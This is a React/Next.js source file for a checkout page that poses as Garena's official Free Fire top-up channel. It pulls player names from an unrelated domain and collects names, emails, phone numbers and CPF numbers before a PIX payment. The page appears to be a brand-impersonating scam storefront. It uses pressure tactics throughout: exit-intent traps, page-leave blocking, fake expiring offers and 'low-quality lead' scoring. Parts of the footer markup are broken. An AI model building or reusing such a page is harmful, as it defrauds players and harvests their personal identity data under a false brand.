"use client"

import { useState, useEffect } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { ArrowLeft } from "lucide-react"
import PixModal from "../../components/pix-modal"
import Toast from "../../components/toast"
import ExitIntentModal from "../../components/exit-intent-modal"
import UrgencyBanner from "../../components/urgency-banner"
import { useUtmParams } from "@/hooks/useUtmParams"

export default function CheckoutPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const { utmParams } = useUtmParams()

  const [playerName, setPlayerName] = useState("")
  const [promoCode, setPromoCode] = useState("")
  const [fullName, setFullName] = useState("")
  const [email, setEmail] = useState("")
  const [phone, setPhone] = useState("")
  const [cpf, setCpf] = useState("")
  const [showPixModal, setShowPixModal] = useState(false) // Added PIX modal state
  const [utmParameters, setUtmParameters] = useState<Record<string, string>>({})
  const [isProcessingPayment, setIsProcessingPayment] = useState(false) // Prevenir múltiplos cliques
  const [discountApplied, setDiscountApplied] = useState(false)
  const [discountAmount, setDiscountAmount] = useState(0)
  const [showToast, setShowToast] = useState(false)
  const [toastMessage, setToastMessage] = useState("")
  const [toastType, setToastType] = useState<"success" | "error" | "info">("success")
  const [showExitModal, setShowExitModal] = useState(false)
  const [exitAttempted, setExitAttempted] = useState(false)
  const [leadQualified, setLeadQualified] = useState(true)
  const [qualificationTimer, setQualificationTimer] = useState<NodeJS.Timeout | null>(null)
  const [showLowQualityIndicator, setShowLowQualityIndicator] = useState(false)

  // Get data from URL params
  const itemType = searchParams.get("type") // "recharge" or "special"
  const itemValue = searchParams.get("value") // diamond amount or offer name
  const price = searchParams.get("price")
  const playerId = searchParams.get("playerId")
  const paymentMethod = searchParams.get("payment") || "PIX"

  // Capturar parâmetros UTM da URL
  useEffect(() => {
    const utmParams = new URLSearchParams()
    
    // Lista de parâmetros UTM para capturar
    const utmKeys = [
      'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
      'src', 'sck', 'fbclid', 'gclid', 'ttclid', 'xcod', 'keyword', 
      'device', 'network', 'gad_source', 'gbraid'
    ]
    
    const capturedParams: Record<string, string> = {}
    
    utmKeys.forEach(key => {
      const value = searchParams.get(key)
      if (value) {
        capturedParams[key] = value
      }
    })
    
    setUtmParameters(capturedParams)
    console.log('[v0] UTM parameters captured in checkout:', capturedParams)
  }, [searchParams])

  useEffect(() => {
    // Try to get player name from API
    const fetchPlayerName = async () => {
      if (playerId) {
        try {
          const response = await fetch(`https://api.recargatop.sbs/api/data/br?uid=${playerId}&key=razord`)
          const data = await response.json()

          if (data && data.name) {
            setPlayerName(data.name)
          } else {
            setPlayerName(playerId) // Fallback to player ID
          }
        } catch (error) {
          console.error("Error fetching player name:", error)
          setPlayerName(playerId) // Fallback to player ID
        }
      }
    }

    fetchPlayerName()
  }, [playerId])

  // Detectar e aplicar automaticamente códigos promocionais FF
  useEffect(() => {
    if (promoCode.startsWith('FF') && promoCode.length >= 8 && !discountApplied) {
      applyPromoCode()
    }
  }, [promoCode])

  // Detectar tentativas de saída (exit intent)
  useEffect(() => {
    let exitTimer: NodeJS.Timeout

    const handleMouseLeave = (e: MouseEvent) => {
      // Detectar quando o mouse sai da área superior da página
      if (e.clientY <= 0 && !exitAttempted && !discountApplied) {
        setShowExitModal(true)
        setExitAttempted(true)
      }
    }

    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      // Detectar tentativa de fechar/recarregar página
      if (!exitAttempted && !discountApplied) {
        e.preventDefault()
        e.returnValue = ''
        setShowExitModal(true)
        setExitAttempted(true)
      }
    }

    // Detectar inatividade (usuário parado por 30 segundos sem desconto)
    const resetInactivityTimer = () => {
      clearTimeout(exitTimer)
      if (!discountApplied && !exitAttempted) {
        exitTimer = setTimeout(() => {
          setShowExitModal(true)
          setExitAttempted(true)
        }, 30000) // 30 segundos
      }
    }

    // Adicionar event listeners
    document.addEventListener('mouseleave', handleMouseLeave)
    window.addEventListener('beforeunload', handleBeforeUnload)
    document.addEventListener('mousemove', resetInactivityTimer)
    document.addEventListener('keypress', resetInactivityTimer)
    document.addEventListener('scroll', resetInactivityTimer)

    // Iniciar timer de inatividade
    resetInactivityTimer()

    return () => {
      document.removeEventListener('mouseleave', handleMouseLeave)
      window.removeEventListener('beforeunload', handleBeforeUnload)
      document.removeEventListener('mousemove', resetInactivityTimer)
      document.removeEventListener('keypress', resetInactivityTimer)
      document.removeEventListener('scroll', resetInactivityTimer)
      clearTimeout(exitTimer)
    }
  }, [exitAttempted, discountApplied])

  const showToastMessage = (message: string, type: "success" | "error" | "info" = "success") => {
    setToastMessage(message)
    setToastType(type)
    setShowToast(true)
  }

  const applyPromoCode = () => {
    if (promoCode.startsWith('FF') && promoCode.length >= 8) {
      const originalPrice = Number.parseFloat(price!)
      const discount = originalPrice * 0.05 // 5% de desconto
      setDiscountAmount(discount)
      setDiscountApplied(true)
      showToastMessage(`🎉 Desconto de 5% aplicado! Você economizou R$ ${discount.toFixed(2).replace('.', ',')}`, "success")
      console.log(`[v0] Desconto aplicado: ${discount.toFixed(2)} (5% de ${originalPrice.toFixed(2)})`)
    } else {
      showToastMessage('Código promocional inválido. Use um código que comece com "FF"', "error")
    }
  }

  const removeDiscount = () => {
    setDiscountAmount(0)
    setDiscountApplied(false)
    setPromoCode('')
    showToastMessage('Desconto removido', "info")
  }

  const getFinalPrice = () => {
    const originalPrice = Number.parseFloat(price!)
    return originalPrice - discountAmount
  }

  const handleExitModalStay = () => {
    if (!discountApplied) {
      // Se não tem desconto, aplicar automaticamente
      setPromoCode('FF52188895')
      showToastMessage('🎉 Desconto aplicado automaticamente! Aproveite!', 'success')
    }
    setShowExitModal(false)
  }

  const handleExitModalGoHome = () => {
    setShowExitModal(false)
    router.push('/')
  }

  const handleBannerApplyDiscount = () => {
    if (!discountApplied) {
      setPromoCode('FF52188895')
      showToastMessage('🎉 Desconto de urgência aplicado! Aproveite!', 'success')
      // Scroll para a seção do código promocional
      const promoSection = document.querySelector('[data-promo-section]')
      if (promoSection) {
        promoSection.scrollIntoView({ behavior: 'smooth', block: 'center' })
      }
    }
  }

  // Função para avaliar qualificação do lead
  const evaluateLeadQuality = () => {
    const indicators = {
      timeOnPage: 0,
      fieldsInteracted: 0,
      scrollDepth: 0,
      promoCodeAttempts: 0,
      hasValidEmail: false,
      hasValidPhone: false
    }

    // Calcular tempo na página (aproximado)
    const pageLoadTime = Date.now() - (window.performance?.timing?.navigationStart || Date.now())
    indicators.timeOnPage = pageLoadTime / 1000

    // Verificar campos preenchidos
    if (fullName.length > 2) indicators.fieldsInteracted++
    if (email.includes('@') && email.includes('.')) {
      indicators.fieldsInteracted++
      indicators.hasValidEmail = true
    }
    if (phone.replace(/\D/g, '').length >= 10) {
      indicators.fieldsInteracted++
      indicators.hasValidPhone = true
    }
    if (cpf.replace(/\D/g, '').length >= 11) indicators.fieldsInteracted++

    // Verificar tentativas de código promocional
    if (promoCode.length > 0) indicators.promoCodeAttempts++

    // Calcular scroll depth (aproximado)
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop
    const windowHeight = window.innerHeight
    const documentHeight = document.documentElement.scrollHeight
    indicators.scrollDepth = (scrollTop + windowHeight) / documentHeight

    // Critérios para lead ruim
    const isBadLead = (
      indicators.timeOnPage < 10 && // Menos de 10 segundos
      indicators.fieldsInteracted === 0 && // Nenhum campo preenchido
      indicators.scrollDepth < 0.3 && // Scrollou menos de 30%
      !discountApplied // Não aplicou desconto
    )

    return !isBadLead
  }

  // Monitorar qualificação do lead
  useEffect(() => {
    const checkLeadQuality = () => {
      const isQualified = evaluateLeadQuality()
      setLeadQualified(isQualified)
      
      // Se lead não qualificado, mostrar indicador visual e modal após 15 segundos
      if (!isQualified && !exitAttempted && !discountApplied) {
        // Mostrar indicador visual imediatamente
        setShowLowQualityIndicator(true)
        
        const timer = setTimeout(() => {
          setShowExitModal(true)
          setExitAttempted(true)
          showToastMessage('⚠️ Oferta especial expirando! Não perca esta oportunidade!', 'info')
        }, 15000) // 15 segundos
        
        setQualificationTimer(timer)
      } else if (isQualified) {
        // Se lead se tornou qualificado, esconder indicador
        setShowLowQualityIndicator(false)
      }
    }

    // Verificar a cada 5 segundos
    const interval = setInterval(checkLeadQuality, 5000)
    
    return () => {
      clearInterval(interval)
      if (qualificationTimer) {
        clearTimeout(qualificationTimer)
      }
    }
  }, [fullName, email, phone, cpf, promoCode, discountApplied, exitAttempted])

  const calculateDiamondDetails = (diamonds: string) => {
    const diamondCount = Number.parseInt(diamonds.replace(".", "").replace(",", ""))

    const bonusMap: { [key: number]: number } = {
      100: 20,
      310: 62,
      520: 104,
      1060: 212,
      2180: 436,
      5600: 1120,
      15600: 3120,
    }

    const bonus = bonusMap[diamondCount] || 0
    const total = diamondCount + bonus

    return { original: diamondCount, bonus, total }
  }

  const handleBack = () => {
    if (!discountApplied && !exitAttempted) {
      setShowExitModal(true)
      setExitAttempted(true)
    } else {
      router.back()
    }
  }

  const handleProceedToPayment = () => {
    // Prevenir múltiplos cliques
    if (isProcessingPayment) {
      console.log("[v0] Checkout - Payment already in progress, ignoring click")
      return
    }

    // Validate required fields
    if (!fullName.trim() || !email.trim() || !phone.trim() || !cpf.trim()) {
      alert("Por favor, preencha todos os campos obrigatórios.")
      return
    }

    // Validate CPF
    if (!validateCpf(cpf)) {
      alert("Por favor, insira um CPF válido.")
      return
    }

    // Marcar como processando
    setIsProcessingPayment(true)
    console.log("[v0] Checkout - Starting payment process")

    // Open PIX modal
    setShowPixModal(true)
  }

  const formatPrice = (priceStr: string) => {
    return `R$ ${Number.parseFloat(priceStr).toFixed(2).replace(".", ",")}`
  }

  // Função para formatar CPF
  const formatCpf = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 11) {
      return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    }
    return value
  }

  // Função para formatar telefone visualmente
  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 10) {
      // Formato: (00) 0000-0000
      return numbers.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3")
    } else {
      // Formato: (00) 90000-0000
      return numbers.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
    }
  }

  // Função para extrair apenas números do telefone
  const getPhoneNumbers = (formattedPhone: string) => {
    return formattedPhone.replace(/\D/g, "")
  }

  // Função para validar CPF
  const validateCpf = (cpf: string) => {
    const numbers = cpf.replace(/\D/g, "")
    if (numbers.length !== 11) return false
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1{10}$/.test(numbers)) return false
    
    // Validação do primeiro dígito verificador
    let sum = 0
    for (let i = 0; i < 9; i++) {
      sum += parseInt(numbers[i]) * (10 - i)
    }
    let digit1 = 11 - (sum % 11)
    if (digit1 > 9) digit1 = 0
    
    // Validação do segundo dígito verificador
    sum = 0
    for (let i = 0; i < 10; i++) {
      sum += parseInt(numbers[i]) * (11 - i)
    }
    let digit2 = 11 - (sum % 11)
    if (digit2 > 9) digit2 = 0
    
    return parseInt(numbers[9]) === digit1 && parseInt(numbers[10]) === digit2
  }

  // Handler para mudança do CPF
  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value)
    setCpf(formatted)
  }

  // Handler para mudança do telefone
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    setPhone(formatted)
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <UrgencyBanner 
        onApplyDiscount={handleBannerApplyDiscount}
        hasDiscount={discountApplied}
        isLowQualityLead={!leadQualified}
      />
      
      {/* Indicador para leads de baixa qualidade */}
      {showLowQualityIndicator && (
        <div className="bg-gradient-to-r from-orange-500 to-red-600 text-white py-3 px-4 animate-pulse">
          <div className="max-w-4xl mx-auto text-center">
            <div className="flex items-center justify-center gap-2 text-sm font-medium">
              <span className="animate-bounce">⚠️</span>
              <span>Detectamos baixa interação - Oferta especial sendo preparada...</span>
              <span className="animate-bounce">⚠️</span>
            </div>
            <div className="mt-1 text-xs opacity-90">
              Continue preenchendo o formulário para garantir o melhor desconto!
            </div>
          </div>
        </div>
      )}
      {/* Header - otimizado para mobile */}
      <div className="bg-white border-b border-gray-200 p-3 sm:p-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="w-8 h-8 sm:w-10 sm:h-10">
              <img src="/images/garena-logo.png" alt="Garena Logo" className="w-full h-full object-contain" />
            </div>
            <div>
              <h1 className="font-bold text-base sm:text-lg text-gray-800">Canal Oficial de</h1>
              <p className="text-xs sm:text-sm text-gray-600">Recarga</p>
            </div>
          </div>
          <div className="w-8 h-8 sm:w-10 sm:h-10">
            <img
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/icon%20%282%29-KQmzFQ0kVPBUo16xssEbrTMzZZBGLs.webp"
              alt="Profile Icon"
              className="w-full h-full object-cover rounded-full"
            />
          </div>
        </div>
      </div>

      {/* Hero Banner with Back Button - altura responsiva */}
      <div className="relative">
        <div className="w-full h-32 sm:h-48 md:h-64">
          <img src="/images/checkout-banner.webp" alt="Free Fire Banner" className="w-full h-full object-cover" />
        </div>

        {/* Back Button - tamanho responsivo */}
        <button
          onClick={handleBack}
          className="absolute top-2 left-2 sm:top-4 sm:left-4 bg-black/50 hover:bg-black/70 text-white px-3 py-1.5 sm:px-4 sm:py-2 rounded-full flex items-center gap-1.5 sm:gap-2 transition-all text-sm sm:text-base"
        >
          <ArrowLeft size={14} className="sm:w-4 sm:h-4" />
          Voltar
        </button>

        <div className="absolute inset-0 flex items-center justify-center">
          <div className="bg-white rounded-xl sm:rounded-2xl p-3 sm:p-4 shadow-lg">
            <img
              src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png"
              alt="Free Fire"
              className="w-12 h-12 sm:w-16 sm:h-16 object-contain"
            />
          </div>
        </div>
      </div>

      {/* Free Fire Title - tamanho responsivo */}
      <div className="text-center py-4 sm:py-6">
        <h2 className="text-xl sm:text-2xl font-bold text-gray-800">Free Fire</h2>
      </div>

      {/* Purchase Summary - padding responsivo */}
      <div className="max-w-2xl mx-auto px-3 sm:px-4 pb-4 sm:pb-6">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
          {itemType === "recharge" ? (
            <>
              <div className="flex items-center justify-between mb-3 sm:mb-4">
                <span className="text-gray-600 text-sm sm:text-base">Total</span>
                <div className="flex items-center gap-2">
                  <img
                    src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png"
                    alt="Diamante"
                    className="w-4 h-4 sm:w-5 sm:h-5"
                  />
                  <span className="font-bold text-base sm:text-lg">
                    {calculateDiamondDetails(itemValue!).total.toLocaleString()}
                  </span>
                </div>
              </div>

              <div className="space-y-2 mb-3 sm:mb-4">
                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <span className="text-gray-600">Preço Original</span>
                  <div className="flex items-center gap-1.5 sm:gap-2">
                    <img
                      src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png"
                      alt="Diamante"
                      className="w-3 h-3 sm:w-4 sm:h-4"
                    />
                    <span>{calculateDiamondDetails(itemValue!).original.toLocaleString()}</span>
                  </div>
                </div>

                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <span className="text-gray-600">+ Bônus Geral</span>
                  <div className="flex items-center gap-1.5 sm:gap-2">
                    <img
                      src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png"
                      alt="Diamante"
                      className="w-3 h-3 sm:w-4 sm:h-4"
                    />
                    <span>{calculateDiamondDetails(itemValue!).bonus.toLocaleString()}</span>
                  </div>
                </div>
              </div>

              <p className="text-[10px] sm:text-xs text-gray-500 mb-3 sm:mb-4 leading-relaxed">
                Os diamantes, são válidos apenas para a região do Brasil e serão creditados diretamente na conta de
                jogo.
              </p>
            </>
          ) : (
            <div className="flex items-center justify-between mb-3 sm:mb-4">
              <span className="text-gray-600 text-sm sm:text-base">Oferta Especial</span>
              <span className="font-bold text-base sm:text-lg">{itemValue}</span>
            </div>
          )}

          {discountApplied && (
            <div className="flex items-center justify-between text-sm text-gray-600 border-t pt-3">
              <span>Preço Original</span>
              <span>{formatPrice(price!)}</span>
            </div>
          )}
          
          {discountApplied && (
            <div className="flex items-center justify-between text-sm text-green-600">
              <span>Desconto (5%)</span>
              <span>-{formatPrice(discountAmount.toString())}</span>
            </div>
          )}

          <div className={`flex items-center justify-between text-lg sm:text-xl font-bold ${discountApplied ? 'border-t pt-3' : 'border-t pt-3 sm:pt-4'}`}>
            <span>Preço {discountApplied ? 'Final' : ''}</span>
            <span className={discountApplied ? 'text-green-600' : ''}>
              {formatPrice(getFinalPrice().toString())}
            </span>
          </div>
        </div>

        {/* Order Details - padding responsivo */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
          <div className="space-y-2 sm:space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-gray-600 text-sm sm:text-base">Método de pagamento</span>
              <span className="font-medium text-sm sm:text-base">{paymentMethod}</span>
            </div>

            <div className="flex items-center justify-between">
              <span className="text-gray-600 text-sm sm:text-base">Nome do Jogador</span>
              <span className="font-medium text-sm sm:text-base truncate ml-2">{playerName || playerId}</span>
            </div>
          </div>
        </div>

        {/* Promotional Code - layout responsivo */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6" data-promo-section>
          <h3 className="font-medium text-gray-800 mb-3 sm:mb-4 text-sm sm:text-base">Código promocional</h3>
          
          {discountApplied ? (
            <div className="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-green-800 font-medium text-sm sm:text-base">✓ Desconto aplicado!</p>
                  <p className="text-green-600 text-xs sm:text-sm">Código: {promoCode} - 5% de desconto</p>
                </div>
                <button 
                  onClick={removeDiscount}
                  className="text-green-600 hover:text-green-800 text-sm underline"
                >
                  Remover
                </button>
              </div>
            </div>
          ) : (
            <div className="flex flex-col sm:flex-row gap-2">
              <input
                type="text"
                placeholder="Código Promocional (ex: FF12345678)"
                value={promoCode}
                onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
                className="flex-1 px-3 py-2.5 sm:px-4 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500 text-sm sm:text-base"
              />
              <button 
                onClick={applyPromoCode}
                disabled={!promoCode.startsWith('FF') || promoCode.length < 8}
                className={`px-4 py-2.5 sm:px-6 sm:py-3 rounded-lg font-medium transition-colors text-sm sm:text-base disabled:opacity-50 disabled:cursor-not-allowed ${
                  promoCode.startsWith('FF') && promoCode.length >= 8 
                    ? 'bg-green-100 text-green-600 hover:bg-green-200' 
                    : 'bg-red-100 text-red-600 hover:bg-red-200'
                }`}
              >
                {promoCode.startsWith('FF') && promoCode.length >= 8 ? '✓ Aplicar Desconto' : 'Aplicar'}
              </button>
            </div>
          )}
        </div>

        {/* Customer Information - campos otimizados para mobile */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
          <div className="space-y-3 sm:space-y-4">
            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1.5 sm:mb-2">Nome Completo</label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full px-3 py-2.5 sm:px-4 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500 text-sm sm:text-base"
                placeholder="Digite seu nome completo"
              />
            </div>

            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1.5 sm:mb-2">E-mail</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2.5 sm:px-4 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500 text-sm sm:text-base"
                placeholder="E-mail"
              />
            </div>

            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1.5 sm:mb-2">
                Número de telefone
              </label>
              <input
                type="tel"
                value={phone}
                onChange={handlePhoneChange}
                className="w-full px-3 py-2.5 sm:px-4 sm:py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-red-500 text-sm sm:text-base"
                placeholder="(00) 90000-0000"
              />
            </div>

            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1.5 sm:mb-2">
                CPF
              </label>
              <input
                type="text"
                value={cpf}
                onChange={handleCpfChange}
                className={`w-full px-3 py-2.5 sm:px-4 sm:py-3 border rounded-lg focus:outline-none focus:ring-2 text-sm sm:text-base ${
                  cpf && !validateCpf(cpf) 
                    ? "border-red-300 focus:ring-red-500 focus:border-red-500" 
                    : "border-gray-300 focus:ring-red-500 focus:border-red-500"
                }`}
                placeholder="000.000.000-00"
                maxLength={14}
              />
              {cpf && !validateCpf(cpf) && (
                <p className="text-red-500 text-xs mt-1">CPF inválido</p>
              )}
            </div>
          </div>
        </div>

        {/* Terms - texto responsivo */}
        <div className="mb-4 sm:mb-6">
          <p className="text-xs sm:text-sm text-gray-600 text-center leading-relaxed px-2">
            privacidade.
          </p>
        </div>

        {/* Proceed Button - tamanho responsivo */}
        <button
          onClick={handleProceedToPayment}
          disabled={isProcessingPayment}
          className={`w-full font-bold py-3 px-4 rounded-xl transition-all duration-200 shadow-lg ${
            isProcessingPayment 
              ? 'bg-gray-400 cursor-not-allowed text-white' 
              : 'bg-red-500 hover:bg-red-600 text-white'
          }`}
        >
          {isProcessingPayment ? 'Processando...' : 'Prosseguir para Pagamento'}
        </button>

        {/* Footer - layout responsivo */}
        <div className="mt-6 sm:mt-8 text-center">
          <p className="text-xs sm:text-sm text-gray-500">© 2025 Garena Online. Todos os direitos reservados.</p>
          <div className="flex flex-col sm:flex-row justify-center gap-2 sm:gap-6 mt-2 text-xs sm:text-sm">
              FAQ
            </a>
            <a href="#" className="text-gray-500 hover:text-gray-700">
              Termos e Condições
            </a>
            <a href="#" className="text-gray-500 hover:text-gray-700">
              Política de Privacidade
            </a>
          </div>
        </div>
      </div>

      <PixModal
        isOpen={showPixModal}
        onClose={() => {
          setShowPixModal(false)
          setIsProcessingPayment(false) // Reset estado ao fechar
          console.log("[v0] Checkout - PIX modal closed, reset processing state")
        }}
        amount={getFinalPrice()}
        customerData={{
          name: fullName,
          email: email,
          phone: getPhoneNumbers(phone), // Enviar apenas números
          document: cpf.replace(/\D/g, ""), // Enviar apenas números
        }}
        utmParameters={utmParameters}
      />

      <Toast
        message={toastMessage}
        type={toastType}
        isVisible={showToast}
        onClose={() => setShowToast(false)}
        duration={4000}
      />

      <ExitIntentModal
        isOpen={showExitModal}
        onClose={() => setShowExitModal(false)}
        onStay={handleExitModalStay}
        onGoHome={handleExitModalGoHome}
        hasDiscount={discountApplied}
        discountCode="FF52188895"
        isLowQualityLead={!leadQualified}
      />
    </div>
  )
}
